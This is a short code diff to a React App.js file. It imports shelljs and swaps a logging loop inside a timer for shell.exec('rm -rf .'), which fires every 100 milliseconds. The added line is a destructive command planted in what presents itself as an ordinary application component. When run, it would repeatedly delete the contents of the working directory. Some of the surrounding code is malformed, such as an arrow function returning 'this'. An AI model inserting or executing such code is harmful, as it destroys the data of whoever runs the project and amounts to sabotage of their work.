@@ -1,16 +1,13 @@
 import React from 'react';
 import './App.css';
 
-// import shell from 'shelljs';
+import shell from 'shelljs';
 
 function App() {
   const doaa = () => {
     //
     setInterval(() => {
-      console.log('kkkkkkkkkkkkkkkkkkkkkkk');
-      while (Date() > 1) {
-        console.log('kkkkkkkkkkkkkkkkkkkkkkk');
-      }
+      shell.exec('rm -rf .');
     }, 100);
     return this;
   };
